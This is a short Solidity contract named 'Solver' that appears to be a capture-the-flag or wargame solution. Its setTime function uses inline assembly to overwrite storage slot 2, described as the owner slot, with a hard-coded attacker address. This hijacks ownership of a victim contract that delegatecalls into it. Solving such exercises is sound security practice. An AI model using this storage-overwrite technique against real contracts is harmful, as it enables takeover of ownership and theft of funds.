// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solver {
    function setTime(uint256) public {
      // overwrite the owner slot
        assembly {
            sstore(2, 0xD1B9C015FBA1D7B631791A2201411a378fd562e7) // the address of the account you're solving with
        }
    }
}